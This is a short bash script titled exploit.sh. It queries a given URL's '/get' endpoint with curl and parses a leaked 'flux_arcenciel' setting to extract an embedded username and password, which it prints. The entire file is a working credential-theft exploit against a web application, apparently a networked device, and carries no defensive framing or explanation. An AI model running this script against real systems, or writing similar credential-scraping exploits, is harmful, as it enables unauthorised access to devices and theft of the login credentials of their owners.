#!/bin/bash

# Ensure the user provided input
if [ -z "$1" ]; then
  
    echo "Usage: ./exploit.sh <url> "
    exit 1
  
fi

# Ensure the URL ends with a '/'
url="$1"
if [[ "$url" != */ ]]; then
  url="$url/"
fi

# Execute curl with the provided input
curl "${url}get" | grep -Eo 'flux_arcenciel\s*=\s*"http://([^:]+):([^@]+)@' | sed 's#flux_arcenciel = "http://##;s#@.*##' | awk -F: '{print "username=" $1 ", password=" $2}'
